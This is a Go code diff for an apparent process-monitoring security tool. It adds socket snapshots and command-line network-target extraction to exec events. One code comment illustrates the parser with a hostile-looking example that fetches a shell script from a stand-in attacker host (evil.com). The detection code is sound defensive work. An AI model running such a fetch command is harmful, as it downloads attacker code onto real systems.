@@ -410,6 +410,11 @@ func (m *Monitor) handleExecEvent(raw []byte) error {
 		Ancestry:      ancestry,
 	}
 
+	// Network enrichment: scan open sockets and parse cmdline for network targets.
+	// Both are best-effort — failures are silently ignored.
+	ev.OpenSockets    = enrichOpenSockets(r.PID)
+	ev.NetworkTargets = enrichNetworkTargets(proc)
+
 	m.bus.Publish(ev)
 	m.logExecEvent(ev)
 	return nil
@@ -940,4 +945,51 @@ func ptraceRequestName(req uint32) string {
 		return name
 	}
 	return fmt.Sprintf("PTRACE_0x%x", req)
+}
+
+// ─── Exec-time network enrichment ────────────────────────────────────────────
+
+// enrichOpenSockets returns a snapshot of all sockets the process has open
+// at the moment the exec event fires.  Timing is inherently racy (the process
+// may not have connected yet) but catches inherited or fast-connecting tools.
+func enrichOpenSockets(pid uint32) []types.SocketInfo {
+	entries := utils.PidOpenSockets(pid)
+	if len(entries) == 0 {
+		return nil
+	}
+	out := make([]types.SocketInfo, 0, len(entries))
+	for _, e := range entries {
+		// Skip pure LISTEN sockets (remote = 0.0.0.0:0)
+		if e.DstIP == "0.0.0.0" || e.DstPort == 0 {
+			continue
+		}
+		out = append(out, types.SocketInfo{
+			SrcIP:    e.SrcIP,
+			SrcPort:  e.SrcPort,
+			DstIP:    e.DstIP,
+			DstPort:  e.DstPort,
+			Protocol: e.Proto,
+			State:    e.State,
+		})
+	}
+	return out
+}
+
+// enrichNetworkTargets extracts URL / hostname / IP targets from the process
+// command line (e.g. "curl https://evil.com/shell.sh" → host=evil.com).
+func enrichNetworkTargets(proc types.ProcessContext) []types.NetworkTarget {
+	raw := utils.ParseNetworkTargets(proc.Comm, proc.Args)
+	if len(raw) == 0 {
+		return nil
+	}
+	out := make([]types.NetworkTarget, 0, len(raw))
+	for _, r := range raw {
+		out = append(out, types.NetworkTarget{
+			Raw:    r.Raw,
+			Host:   r.Host,
+			Port:   r.Port,
+			Scheme: r.Scheme,
+		})
+	}
+	return out
 }
